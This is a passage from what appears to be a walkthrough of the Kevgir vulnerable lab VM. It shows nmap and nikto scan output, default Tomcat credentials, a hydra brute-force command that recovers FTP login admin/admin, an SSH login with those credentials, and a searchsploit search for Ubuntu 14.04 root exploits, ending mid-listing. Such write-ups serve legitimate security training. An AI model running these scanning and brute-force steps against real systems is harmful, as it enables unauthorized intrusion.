</span><span class='line'><span class="p">|</span>_See http://nmap.org/nsedoc/scripts/http-methods.html
</span><span class='line'><span class="p">|</span>_http-open-proxy: Proxy might be redirecting requests
</span><span class='line'><span class="p">|</span>_http-server-header: Apache-Coyote/1.1
</span><span class='line'><span class="p">|</span>_http-title: Apache Tomcat
</span><span class='line'>8081/tcp  open  http        Apache httpd 2.4.7 <span class="o">((</span>Ubuntu<span class="o">))</span>
</span><span class='line'><span class="p">|</span>_http-generator: Joomla! 1.5 - Open Source Content Management
</span><span class='line'><span class="p">|</span>_http-methods: No Allow or Public header in OPTIONS response <span class="o">(</span>status code 200<span class="o">)</span>
</span><span class='line'><span class="p">|</span> http-robots.txt: <span class="m">14</span> disallowed entries
</span><span class='line'><span class="p">|</span> /administrator/ /cache/ /components/ /images/
</span><span class='line'><span class="p">|</span> /includes/ /installation/ /language/ /libraries/ /media/
</span><span class='line'><span class="p">|</span>_/modules/ /plugins/ /templates/ /tmp/ /xmlrpc/
</span><span class='line'><span class="p">|</span>_http-server-header: Apache/2.4.7 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span><span class='line'><span class="p">|</span>_http-title: Welcome to the Frontpage
</span><span class='line'>9000/tcp  open  http        Jetty winstone-2.9
</span><span class='line'><span class="p">|</span>_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
</span><span class='line'><span class="p">|</span>_http-methods: No Allow or Public header in OPTIONS response <span class="o">(</span>status code 200<span class="o">)</span>
</span><span class='line'><span class="p">|</span> http-robots.txt: <span class="m">1</span> disallowed entry
</span><span class='line'><span class="p">|</span>_/
</span><span class='line'><span class="p">|</span>_http-server-header: Jetty<span class="o">(</span>winstone-2.9<span class="o">)</span>
</span><span class='line'><span class="p">|</span>_http-title: Dashboard <span class="o">[</span>Jenkins<span class="o">]</span>
</span><span class='line'>34551/tcp open  ssh         Apache Mina sshd 0.8.0 <span class="o">(</span>protocol 2.0<span class="o">)</span>
</span><span class='line'>35812/tcp open  mountd      1-3 <span class="o">(</span>RPC <span class="c">#100005)</span>
</span><span class='line'><span class="p">|</span> rpcinfo:
</span><span class='line'><span class="p">|</span>   program version   port/proto  service
</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/tcp  rpcbind
</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/udp  rpcbind
</span><span class='line'><span class="p">|</span>   <span class="m">100003</span>  2,3,4       2049/tcp  nfs
</span><span class='line'><span class="p">|</span>   <span class="m">100003</span>  2,3,4       2049/udp  nfs
</span><span class='line'><span class="p">|</span>   <span class="m">100005</span>  1,2,3      56442/udp  mountd
</span><span class='line'><span class="p">|</span>   <span class="m">100005</span>  1,2,3      59876/tcp  mountd
</span><span class='line'><span class="p">|</span>   <span class="m">100021</span>  1,3,4      52779/udp  nlockmgr
</span><span class='line'><span class="p">|</span>   <span class="m">100021</span>  1,3,4      59788/tcp  nlockmgr
</span><span class='line'><span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>          35287/udp  status
</span><span class='line'><span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>          44966/tcp  status
</span><span class='line'><span class="p">|</span>   <span class="m">100227</span>  2,3         2049/tcp  nfs_acl
</span><span class='line'><span class="p">|</span>_  <span class="m">100227</span>  2,3         2049/udp  nfs_acl
</span><span class='line'>37543/tcp open  mountd      1-3 <span class="o">(</span>RPC <span class="c">#100005)</span>
</span><span class='line'><span class="p">|</span> rpcinfo:
</span><span class='line'><span class="p">|</span>   program version   port/proto  service
</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/tcp  rpcbind
</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/udp  rpcbind
</span><span class='line'><span class="p">|</span>   <span class="m">100003</span>  2,3,4       2049/tcp  nfs
</span><span class='line'><span class="p">|</span>   <span class="m">100003</span>  2,3,4       2049/udp  nfs
</span><span class='line'><span class="p">|</span>   <span class="m">100005</span>  1,2,3      56442/udp  mountd
</span><span class='line'><span class="p">|</span>   <span class="m">100005</span>  1,2,3      59876/tcp  mountd
</span><span class='line'><span class="p">|</span>   <span class="m">100021</span>  1,3,4      52779/udp  nlockmgr
</span><span class='line'><span class="p">|</span>   <span class="m">100021</span>  1,3,4      59788/tcp  nlockmgr
</span><span class='line'><span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>          35287/udp  status
</span><span class='line'><span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>          44966/tcp  status
</span><span class='line'><span class="p">|</span>   <span class="m">100227</span>  2,3         2049/tcp  nfs_acl
</span><span class='line'><span class="p">|</span>_  <span class="m">100227</span>  2,3         2049/udp  nfs_acl
</span><span class='line'>41295/tcp open  unknown
</span><span class='line'>44966/tcp open  status      <span class="m">1</span> <span class="o">(</span>RPC <span class="c">#100024)</span>
</span><span class='line'><span class="p">|</span> rpcinfo:
</span><span class='line'><span class="p">|</span>   program version   port/proto  service
</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/tcp  rpcbind
</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/udp  rpcbind
</span><span class='line'><span class="p">|</span>   <span class="m">100003</span>  2,3,4       2049/tcp  nfs
</span><span class='line'><span class="p">|</span>   <span class="m">100003</span>  2,3,4       2049/udp  nfs
</span><span class='line'><span class="p">|</span>   <span class="m">100005</span>  1,2,3      56442/udp  mountd
</span><span class='line'><span class="p">|</span>   <span class="m">100005</span>  1,2,3      59876/tcp  mountd
</span><span class='line'><span class="p">|</span>   <span class="m">100021</span>  1,3,4      52779/udp  nlockmgr
</span><span class='line'><span class="p">|</span>   <span class="m">100021</span>  1,3,4      59788/tcp  nlockmgr
</span><span class='line'><span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>          35287/udp  status
</span><span class='line'><span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>          44966/tcp  status
</span><span class='line'><span class="p">|</span>   <span class="m">100227</span>  2,3         2049/tcp  nfs_acl
</span><span class='line'><span class="p">|</span>_  <span class="m">100227</span>  2,3         2049/udp  nfs_acl
</span><span class='line'>59788/tcp open  nlockmgr    1-4 <span class="o">(</span>RPC <span class="c">#100021)</span>
</span><span class='line'><span class="p">|</span> rpcinfo:
</span><span class='line'><span class="p">|</span>   program version   port/proto  service
</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/tcp  rpcbind
</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/udp  rpcbind
</span><span class='line'><span class="p">|</span>   <span class="m">100003</span>  2,3,4       2049/tcp  nfs
</span><span class='line'><span class="p">|</span>   <span class="m">100003</span>  2,3,4       2049/udp  nfs
</span><span class='line'><span class="p">|</span>   <span class="m">100005</span>  1,2,3      56442/udp  mountd
</span><span class='line'><span class="p">|</span>   <span class="m">100005</span>  1,2,3      59876/tcp  mountd
</span><span class='line'><span class="p">|</span>   <span class="m">100021</span>  1,3,4      52779/udp  nlockmgr
</span><span class='line'><span class="p">|</span>   <span class="m">100021</span>  1,3,4      59788/tcp  nlockmgr
</span><span class='line'><span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>          35287/udp  status
</span><span class='line'><span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>          44966/tcp  status
</span><span class='line'><span class="p">|</span>   <span class="m">100227</span>  2,3         2049/tcp  nfs_acl
</span><span class='line'><span class="p">|</span>_  <span class="m">100227</span>  2,3         2049/udp  nfs_acl
</span><span class='line'>59876/tcp open  mountd      1-3 <span class="o">(</span>RPC <span class="c">#100005)</span>
</span><span class='line'><span class="m">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span><span class='line'>SF-Port41295-TCP:V<span class="o">=</span>6.49BETA5%I<span class="o">=</span>7%D<span class="o">=</span>5/23%Time<span class="o">=</span>5742D989%P<span class="o">=</span>x86_64-pc-linux-gn
</span><span class='line'>SF:u%r<span class="o">(</span>DNSVersionBindReq,36,<span class="s2">&quot;Unrecognized\x20protocol:\x20\0\x06\x01\0\0\x</span>
</span><span class='line'><span class="s2">SF:01\0\0\0\0\0\0\x07version\x04bind\0\0\x10\0\x03\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>DNSStatusRequest,
</span><span class='line'>SF:24,<span class="s2">&quot;Unrecognized\x20protocol:\x20\0\0\x10\0\0\0\0\0\0\0\0\0\n&quot;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>MAC Address: 00:0C:29:C1:44:AE <span class="o">(</span>VMware<span class="o">)</span>
</span><span class='line'>Device <span class="nb">type</span>: general purpose
</span><span class='line'>Running: Linux 3.X
</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:3
</span><span class='line'>OS details: Linux 3.2 - 3.19
</span><span class='line'>Uptime guess: 0.015 days <span class="o">(</span>since Mon May <span class="m">23</span> 06:01:00 2016<span class="o">)</span>
</span><span class='line'>Network Distance: <span class="m">1</span> hop
</span><span class='line'>TCP Sequence Prediction: <span class="nv">Difficulty</span><span class="o">=</span><span class="m">247</span> <span class="o">(</span>Good luck!<span class="o">)</span>
</span><span class='line'>IP ID Sequence Generation: All zeros
</span><span class='line'>Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span><span class='line'>
</span><span class='line'>Host script results:
</span><span class='line'><span class="p">|</span> nbstat: NetBIOS name: CANYOUPWNME, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; <span class="o">(</span>unknown<span class="o">)</span>
</span><span class='line'><span class="p">|</span> Names:
</span><span class='line'><span class="p">|</span>   CANYOUPWNME&lt;00&gt;      Flags: &lt;unique&gt;&lt;active&gt;
</span><span class='line'><span class="p">|</span>   CANYOUPWNME&lt;03&gt;      Flags: &lt;unique&gt;&lt;active&gt;
</span><span class='line'><span class="p">|</span>   CANYOUPWNME&lt;20&gt;      Flags: &lt;unique&gt;&lt;active&gt;
</span><span class='line'><span class="p">|</span>   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
</span><span class='line'><span class="p">|</span>_  WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
</span><span class='line'><span class="p">|</span> smb-os-discovery:
</span><span class='line'><span class="p">|</span>   OS: Unix <span class="o">(</span>Samba 4.1.6-Ubuntu<span class="o">)</span>
</span><span class='line'><span class="p">|</span>   Computer name: canyoupwnme
</span><span class='line'><span class="p">|</span>   NetBIOS computer name: CANYOUPWNME
</span><span class='line'><span class="p">|</span>   Domain name:
</span><span class='line'><span class="p">|</span>   FQDN: canyoupwnme
</span><span class='line'><span class="p">|</span>_  System <span class="nb">time</span>: 2016-05-23T13:22:22+03:00
</span><span class='line'><span class="p">|</span> smb-security-mode:
</span><span class='line'><span class="p">|</span>   account_used: guest
</span><span class='line'><span class="p">|</span>   authentication_level: user
</span><span class='line'><span class="p">|</span>   challenge_response: supported
</span><span class='line'><span class="p">|</span>_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
</span><span class='line'><span class="p">|</span>_smbv2-enabled: Server supports SMBv2 protocol
</span><span class='line'>
</span><span class='line'>TRACEROUTE
</span><span class='line'>HOP RTT     ADDRESS
</span><span class='line'><span class="m">1</span>   0.34 ms 10.1.1.128
</span><span class='line'>
</span><span class='line'>Read data files from: /usr/bin/../share/nmap
</span><span class='line'>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span><span class='line'><span class="c"># Nmap done at Mon May 23 06:22:54 2016 -- 1 IP address (1 host up) scanned in 153.46 seconds</span>
</span></code></pre></td></tr></table></div></figure>


<p>There are some suspectable information:</p>

<ul>
<li>FTP service is running on port 25</li>
<li>SSH service is running on port 1322</li>
<li>Web service is running on port 80</li>
<li>Redis services is running on port 6379</li>
<li>Tomcat is running on port 8080</li>
<li>Joomla v1.5 is running on port 8081</li>
<li>Jenkins is running on port 9000</li>
</ul>


<p>In the meanwhile, I run <code>nikto</code> to scan web vulnerabilities in terms of port 80, 8080, 9091 and 9000 found by port-scanning stage.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>- Nikto v2.1.6
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Target IP:          10.1.1.128
</span><span class='line'>+ Target Hostname:    10.1.1.128
</span><span class='line'>+ Target Port:        80
</span><span class='line'>+ Start Time:         2016-05-23 06:28:48 <span class="o">(</span>GMT-4<span class="o">)</span>
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Server: Apache/2.4.7 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span><span class='line'>+ Server leaks inodes via ETags, header found with file /, fields: 0xec 0x52c8b6c4fbb0a
</span><span class='line'>+ The anti-clickjacking X-Frame-Options header is not present.
</span><span class='line'>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
</span><span class='line'>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME <span class="nb">type</span>
</span><span class='line'>+ Apache/2.4.7 appears to be outdated <span class="o">(</span>current is at least Apache/2.4.12<span class="o">)</span>. Apache 2.0.65 <span class="o">(</span>final release<span class="o">)</span> and 2.2.29 are also current.
</span><span class='line'>+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
</span><span class='line'>+ Retrieved x-powered-by header: PHP/5.5.9-1ubuntu4.14
</span><span class='line'>+ Uncommon header <span class="s1">&#39;x-ob_mode&#39;</span> found, with contents: 0
</span><span class='line'>+ OSVDB-3233: /icons/README: Apache default file found.
</span><span class='line'>+ /phpmyadmin/: phpMyAdmin directory found
</span><span class='line'>+ <span class="m">8479</span> requests: <span class="m">0</span> error<span class="o">(</span>s<span class="o">)</span> and <span class="m">10</span> item<span class="o">(</span>s<span class="o">)</span> reported on remote host
</span><span class='line'>+ End Time:           2016-05-23 06:29:07 <span class="o">(</span>GMT-4<span class="o">)</span> <span class="o">(</span><span class="m">19</span> seconds<span class="o">)</span>
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ <span class="m">1</span> host<span class="o">(</span>s<span class="o">)</span> tested
</span></code></pre></td></tr></table></div></figure>


<p>phpmyadmin was found but nothing else, so I move on to port 8080.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>- Nikto v2.1.6
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Target IP:          10.1.1.128
</span><span class='line'>+ Target Hostname:    10.1.1.128
</span><span class='line'>+ Target Port:        8080
</span><span class='line'>+ Start Time:         2016-05-23 06:30:28 <span class="o">(</span>GMT-4<span class="o">)</span>
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Server: Apache-Coyote/1.1
</span><span class='line'>+ Server leaks inodes via ETags, header found with file /, fields: 0xW/1895 0x1454530701000
</span><span class='line'>+ The anti-clickjacking X-Frame-Options header is not present.
</span><span class='line'>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
</span><span class='line'>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME <span class="nb">type</span>
</span><span class='line'>+ No CGI Directories found <span class="o">(</span>use <span class="s1">&#39;-C all&#39;</span> to force check all possible <span class="nb">dirs</span><span class="o">)</span>
</span><span class='line'>+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS
</span><span class='line'>+ OSVDB-397: HTTP method <span class="o">(</span><span class="s1">&#39;Allow&#39;</span> Header<span class="o">)</span>: <span class="s1">&#39;PUT&#39;</span> method could allow clients to save files on the web server.
</span><span class='line'>+ OSVDB-5646: HTTP method <span class="o">(</span><span class="s1">&#39;Allow&#39;</span> Header<span class="o">)</span>: <span class="s1">&#39;DELETE&#39;</span> may allow clients to remove files on the web server.
</span><span class='line'>+ /: Appears to be a default Apache Tomcat install.
</span><span class='line'>+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
</span><span class='line'>+ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.
</span><span class='line'>+ Default account found <span class="k">for</span> <span class="s1">&#39;Tomcat Manager Application&#39;</span> at /manager/html <span class="o">(</span>ID <span class="s1">&#39;tomcat&#39;</span>, PW <span class="s1">&#39;tomcat&#39;</span><span class="o">)</span>. Apache Tomcat.
</span><span class='line'>+ /manager/html: Tomcat Manager / Host Manager interface found <span class="o">(</span>pass protected<span class="o">)</span>
</span><span class='line'>+ /host-manager/html: Tomcat Manager / Host Manager interface found <span class="o">(</span>pass protected<span class="o">)</span>
</span><span class='line'>+ /manager/status: Tomcat Server Status interface found <span class="o">(</span>pass protected<span class="o">)</span>
</span><span class='line'>+ <span class="m">7643</span> requests: <span class="m">0</span> error<span class="o">(</span>s<span class="o">)</span> and <span class="m">14</span> item<span class="o">(</span>s<span class="o">)</span> reported on remote host
</span><span class='line'>+ End Time:           2016-05-23 06:30:50 <span class="o">(</span>GMT-4<span class="o">)</span> <span class="o">(</span><span class="m">22</span> seconds<span class="o">)</span>
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ <span class="m">1</span> host<span class="o">(</span>s<span class="o">)</span> tested
</span></code></pre></td></tr></table></div></figure>


<p>Based on the result, default tomcat login/password was found: <font color="red"><code>tomcat/tomcat</code></font></p>

<h3>Vector 1: FTP login bruteforce attack</h3>

<p>Use <code>hydra</code> with <a href="https://github.com/danielmiessler/SecLists" title="SecLists">SecLists</a> dictionary to brute force week password:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/Kevgir# hydra -L ~/tools/SecLists/Usernames/top_shortlist.txt -P ~/tools/SecLists/Passwords/john.txt -u -s <span class="m">25</span> 10.1.1.128 ftp
</span><span class='line'>Hydra v8.1 <span class="o">(</span>c<span class="o">)</span> <span class="m">2014</span> by van Hauser/THC - Please <span class="k">do</span> not use in military or secret service organizations, or <span class="k">for</span> illegal purposes.
</span><span class='line'>
</span><span class='line'>Hydra <span class="o">(</span>http://www.thc.org/thc-hydra<span class="o">)</span> starting at 2016-05-23 06:52:29
</span><span class='line'><span class="o">[</span>DATA<span class="o">]</span> max <span class="m">16</span> tasks per <span class="m">1</span> server, overall <span class="m">64</span> tasks, <span class="m">34177</span> login tries <span class="o">(</span>l:11/p:3107<span class="o">)</span>, ~33 tries per task
</span><span class='line'><span class="o">[</span>DATA<span class="o">]</span> attacking service ftp on port 25
</span><span class='line'><span class="o">[</span>STATUS<span class="o">]</span> 320.00 tries/min, <span class="m">320</span> tries in 00:01h, <span class="m">33857</span> todo in 01:46h, <span class="m">16</span> active
</span><span class='line'><span class="o">[</span>STATUS<span class="o">]</span> 320.33 tries/min, <span class="m">961</span> tries in 00:03h, <span class="m">33216</span> todo in 01:44h, <span class="m">16</span> active
</span><span class='line'><span class="o">[</span>STATUS<span class="o">]</span> 314.14 tries/min, <span class="m">2199</span> tries in 00:07h, <span class="m">31978</span> todo in 01:42h, <span class="m">16</span> active
</span><span class='line'><span class="o">[</span>STATUS<span class="o">]</span> 311.20 tries/min, <span class="m">4668</span> tries in 00:15h, <span class="m">29509</span> todo in 01:35h, <span class="m">16</span> active
</span><span class='line'><span class="o">[</span>STATUS<span class="o">]</span> 310.39 tries/min, <span class="m">9622</span> tries in 00:31h, <span class="m">24555</span> todo in 01:20h, <span class="m">16</span> active
</span><span class='line'><span class="o">[</span>STATUS<span class="o">]</span> 311.81 tries/min, <span class="m">14655</span> tries in 00:47h, <span class="m">19522</span> todo in 01:03h, <span class="m">16</span> active
</span><span class='line'><span class="o">[</span>25<span class="o">][</span>ftp<span class="o">]</span> host: 10.1.1.128   login: admin   password: admin
</span><span class='line'><span class="o">[</span>STATUS<span class="o">]</span> 313.14 tries/min, <span class="m">19728</span> tries in 01:03h, <span class="m">14449</span> todo in 00:47h, <span class="m">16</span> active
</span><span class='line'>^CThe session file ./hydra.restore was written. Type <span class="s2">&quot;hydra -R&quot;</span> to resume session.
</span><span class='line'>root@kali:~/Kevgir#
</span></code></pre></td></tr></table></div></figure>


<p>login/password found: <font color="red"><code>admin/admin</code></font></p>

<p>Then using the found username/password login via SSH (port 1322), and &hellip; succeed!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/Kevgir# ssh -p <span class="m">1322</span> admin@10.1.1.128
</span><span class='line'>The authenticity of host <span class="s1">&#39;[10.1.1.128]:1322 ([10.1.1.128]:1322)&#39;</span> can<span class="s1">&#39;t be established.</span>
</span><span class='line'><span class="s1">ECDSA key fingerprint is 3b:03:cd:29:7b:5e:9f:3b:62:79:ed:dc:82:c7:48:8a.</span>
</span><span class='line'><span class="s1">Are you sure you want to continue connecting (yes/no)? yes</span>
</span><span class='line'><span class="s1">Warning: Permanently added &#39;</span><span class="o">[</span>10.1.1.128<span class="o">]</span>:1322<span class="s1">&#39; (ECDSA) to the list of known hosts.</span>
</span><span class='line'><span class="s1">                                                                  </span>
</span><span class='line'><span class="s1">                                                                  </span>
</span><span class='line'><span class="s1">  G:                ,;                                            </span>
</span><span class='line'><span class="s1">  E#,    :        f#i                        .Gt  t    j.         </span>
</span><span class='line'><span class="s1">  E#t  .GE      .E#t                        j#W:  Ej   EW,        </span>
</span><span class='line'><span class="s1">  E#t j#K;     i#W,     t      .DD.       ;K#f    E#,  E##j       </span>
</span><span class='line'><span class="s1">  E#GK#f      L#D.      EK:   ,WK.      .G#D.     E#t  E###D.     </span>
</span><span class='line'><span class="s1">  E##D.     :K#Wfff;    E#t  i#D       j#K;       E#t  E#jG#W;    </span>
</span><span class='line'><span class="s1">  E##Wi     i##WLLLLt   E#t j#f      ,K#f   ,GD;  E#t  E#t t##f   </span>
</span><span class='line'><span class="s1">  E#jL#D:    .E#L       E#tL#i        j#Wi   E#t  E#t  E#t  :K#E: </span>
</span><span class='line'><span class="s1">  E#t ,K#j     f#E:     E#WW,          .G#D: E#t  E#t  E#KDDDD###i</span>
</span><span class='line'><span class="s1">  E#t   jD      ,WW;    E#K:             ,K#fK#t  E#t  E#f,t#Wi,,,</span>
</span><span class='line'><span class="s1">  j#t            .D#;   ED.                j###t  E#t  E#t  ;#W:  </span>
</span><span class='line'><span class="s1">   ,;              tt   t                   .G#t  E#t  DWi   ,KK: </span>
</span><span class='line'><span class="s1">                                              ;;  ,;.             </span>
</span><span class='line'><span class="s1">                                                                  </span>
</span><span class='line'><span class="s1">                                                   by canyoupwn.me</span>
</span><span class='line'>
</span><span class='line'><span class="s1">admin@10.1.1.128&#39;</span>s password:
</span><span class='line'>Welcome to Ubuntu 14.04.3 LTS <span class="o">(</span>GNU/Linux 3.19.0-25-generic i686<span class="o">)</span>
</span><span class='line'>
</span><span class='line'> * Documentation:  https://help.ubuntu.com/
</span><span class='line'>
</span><span class='line'>  System information as of Mon May <span class="m">23</span> 22:56:12 EEST 2016
</span><span class='line'>
</span><span class='line'>  System load: 0.32              Memory usage: 4%   Processes:       167
</span><span class='line'>  Usage of /:  32.5% of 6.50GB   Swap usage:   0%   Users logged in: 0
</span><span class='line'>
</span><span class='line'>  Graph this data and manage this system at:
</span><span class='line'>    https://landscape.canonical.com/
</span><span class='line'>
</span><span class='line'><span class="m">151</span> packages can be updated.
</span><span class='line'><span class="m">79</span> updates are security updates.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>The programs included with the Ubuntu system are free software<span class="p">;</span>
</span><span class='line'>the exact distribution terms <span class="k">for</span> each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
</span><span class='line'>applicable law.
</span><span class='line'>
</span><span class='line'>admin@canyoupwnme:~<span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>admin<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>admin<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>admin<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Then, spending time on enumeration and found the target system is <code>Ubuntu 14.04</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>admin@canyoupwnme:/home/user<span class="nv">$ </span>uname -a
</span><span class='line'>Linux canyoupwnme 3.19.0-25-generic <span class="c">#26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux</span>
</span></code></pre></td></tr></table></div></figure>


<p>Try to local priv escape and searching keyword <code>14.04</code> in exploit-db</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:/usr/share/exploitdb# ./searchsploit 14.04
</span><span class='line'>------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------
</span><span class='line'> Exploit Title                                                                                                                             <span class="p">|</span>  Path
</span><span class='line'>                                                                                                                                           <span class="p">|</span> <span class="o">(</span>/usr/share/exploitdb/platforms<span class="o">)</span>
</span><span class='line'>------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------
</span><span class='line'>Apport 2.14.1 <span class="o">(</span>Ubuntu 14.04.2<span class="o">)</span> - Linux Local Root Exploit                                                                                  <span class="p">|</span> ./linux/local/36782.sh
</span><span class='line'>Seagate Central 2014.0410.0026-F Remote Root Exploit                                                                                       <span class="p">|</span> ./hardware/remote/37184.py
</span><span class='line'>Seagate Central 2014.0410.0026-F Remote Facebook Access Token Exploit                                                                      <span class="p">|</span> ./hardware/webapps/37185.py
